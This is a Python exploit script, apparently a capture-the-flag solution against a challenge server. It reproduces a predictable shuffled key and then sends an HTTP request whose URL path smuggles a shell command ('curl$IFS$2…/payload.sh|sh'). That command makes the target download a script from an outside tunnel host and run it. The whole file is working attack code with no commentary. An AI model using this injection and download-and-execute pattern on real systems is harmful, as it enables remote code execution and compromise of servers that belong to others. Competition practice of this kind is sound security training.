import requests
import subprocess
import os
import hashlib
import datetime

url = "http://chiptunegeek.shellweplayaga.me:194/"
header = {
    "Ticket": "ticket{SwapNullmodem1179n24:j89H0k4sPT3D2inNeug6fUCaJQ2Mn0J2-2bNEcpiRfWVbFrR}"
}
# proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
payload = "curl$IFS$2https://095ab4b1de06dd.lhr.life/payload.sh|sh"

time_string = datetime.datetime(2006, 4, 23, 7)
seconds_since_epoch = int(time_string.timestamp()) // 86400

md5_out = hashlib.md5(f"{str(seconds_since_epoch)}\n".encode()).hexdigest()
with open("a", "w") as f:
    f.write(md5_out * 10)

key = subprocess.getoutput(
    "echo 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789' | grep -o . | shuf --random-source ./a | tr -d '\n'"
)
print(key)
print(url + key + "/" + payload)
res = requests.get(url + key + "/" + payload, headers=header)